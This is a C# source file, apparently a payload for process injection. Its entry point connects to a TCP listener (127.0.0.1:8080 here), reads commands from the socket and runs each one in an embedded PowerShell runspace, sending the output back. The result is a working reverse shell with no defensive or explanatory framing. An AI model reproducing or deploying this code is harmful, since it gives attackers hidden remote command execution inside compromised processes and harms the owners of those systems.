using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Net.Sockets;

namespace Injected
{
    public class Injected
    {
        [DllImport("kernel32.dll")]
        static extern void OutputDebugString(string lpOutputString);

        private static string runCommand(PowerShell PowerShellInstance, string script)
        {
            StringBuilder output = new StringBuilder();

            PowerShellInstance.AddScript(script);

            Collection<PSObject> PSOutput = PowerShellInstance.Invoke();

            foreach (PSObject outputItem in PSOutput)
            {
                if (outputItem != null)
                {
                    output.Append(outputItem.ToString() + "\n");
                }
            }

            Collection <ErrorRecord> errors = PowerShellInstance.Streams.Error.ReadAll();
            foreach (ErrorRecord error in errors)
            {
                if (error != null)
                {
                    output.Append(error.Exception.ToString() + "\n");
                }
            }
            PowerShellInstance.Commands.Clear();
            PowerShellInstance.Streams.ClearStreams();
            PowerShellInstance.Streams.Error.Clear();
            PowerShellInstance.Commands.Clear();


            return output.ToString();
        }

        public static int EntryPoint(string pwzArgument)
        {
            string output = "";
            using (PowerShell PowerShellInstance = PowerShell.Create())
            {
                Int32 port = 8080;
                TcpClient client = new TcpClient("127.0.0.1", port);
                NetworkStream stream = client.GetStream();

                while(true)
                {
                    if(!client.Connected)
                    {
                        break;
                    }
                    string message = "> ";
                    Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);
                    stream.Write(data, 0, data.Length);

                    data = new Byte[256];
                    String responseData = String.Empty;
                    Int32 bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    if (responseData.Trim().ToLower().Equals("exit"))
                    {
                        break;
                    }


                    string cmdOut = runCommand(PowerShellInstance, responseData);
                    data = System.Text.Encoding.ASCII.GetBytes(cmdOut);
                    stream.Write(data, 0, data.Length);
                }
                // Close everything.
                stream.Close();
                client.Close();

                output = "[PSINJECT] " + output;
                OutputDebugString(output);
            }
            return 0;
        }
    }
}
